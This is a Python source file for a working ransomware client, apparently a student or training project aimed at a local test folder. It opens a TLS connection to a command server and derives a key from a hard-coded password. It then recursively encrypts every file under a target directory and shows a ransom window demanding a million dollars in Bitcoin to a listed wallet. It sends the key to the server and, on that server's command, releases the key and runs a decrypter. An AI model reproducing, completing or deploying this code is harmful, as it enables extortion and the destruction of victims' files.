import ssl
import socket

import pyperclip

import base64
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

import tkinter as tk
from tkinter import messagebox

import json

import subprocess

IP = "127.0.0.1"
PORT = 9443
def create_conn():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((IP,PORT))
    print("Connected!")
    return client_socket

def wrap_conn(client_socket,certfile):
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.load_verify_locations(certfile)
    ssl_context.check_hostname = False
    ssl_socket = ssl_context.wrap_socket(client_socket)
    return ssl_socket

def create_encryption_key(password):
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=1_200_000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key
        
def transfer_key_to_cipher(key):
    return Fernet(key)        
        
def read_file_content(path):
    with open(path,'rb') as file:
        content = file.read()
    return content

def write_file(content,path):
    with open(path,'wb') as file:
        file.write(content)

def encrypt_file_content(path,cipher):
    file_content = read_file_content(path)
    encrypted_content = cipher.encrypt(file_content)
    write_file(encrypted_content,path)
    
def encrypt_files(path,cipher):
    files = os.listdir(path)
    for file in files:
        new_path = os.path.join(path, file)
        if os.path.isfile(new_path):
            encrypt_file_content(new_path,cipher)
            
        elif os.path.isdir(new_path):
            encrypt_files(new_path,cipher)

def show_victim_window():
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Victim message", """You fool, your files has been encrypted🔐! 
                        \n you need to pay me one milion dollars💲worth of Bitcoin to decrypt your precious files 
                        \n wallet addr - 15f6S5WTfkX5Wp2fdKYVkDVCyHV288pnDt""")    

def decrypter_process(path):
    subprocess.run(["python", "decrypter.py", path])

def show_key_window(key):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Victim message", f"""thank you for your genurous payment! 💲
                        \n you may decrypt your files with the smart decoder i made just for you
                        \n it might take a moment, thank you for your patience.
                        \n key - {key} 
                        """)

def show_clipboard_msg():
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Victim message","copied key to clipboard")

def main():
    conn = create_conn()
    secured_conn = wrap_conn(conn,"server.crt")
    # path = r"C:\Users\Sahar Levy\Desktop\Projects\test_folder"
    path = r"C:\Users\Pc2\test_folder"
    password = "gamma_cyber_youngfortech"
    key = create_encryption_key(password)
    cipher = transfer_key_to_cipher(key)
    encrypt_files(path,cipher)
    
    show_victim_window()
    
    secured_conn.send(key)
    
    request = secured_conn.recv(1024)
    request = json.loads(request.decode())
    if request["action"] == "start decoder process":
        base64_key = request["key"]
        key = base64.b64decode(base64_key).decode()
        show_key_window(key)

        show_clipboard_msg()
        pyperclip.copy(key)
        decrypter_process(path)

if __name__ == "__main__":
    main()